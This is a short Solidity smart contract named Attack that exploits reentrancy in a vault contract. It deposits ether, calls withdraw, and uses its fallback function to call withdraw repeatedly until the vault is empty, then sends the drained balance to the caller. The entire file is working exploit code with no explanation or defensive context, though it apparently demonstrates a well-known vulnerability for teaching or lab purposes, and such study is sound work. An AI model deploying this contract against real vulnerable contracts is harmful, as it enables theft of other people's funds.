// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.8;

interface IAttack {
    function attack(address targetVault) external payable;
}

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack is IAttack {
    IVault private target;

    function attack(address targetVault) public payable {
        target = IVault(targetVault);
        target.deposit{value: msg.value}();
        target.withdraw();

        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "ETH transfer failed");
    }

    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
}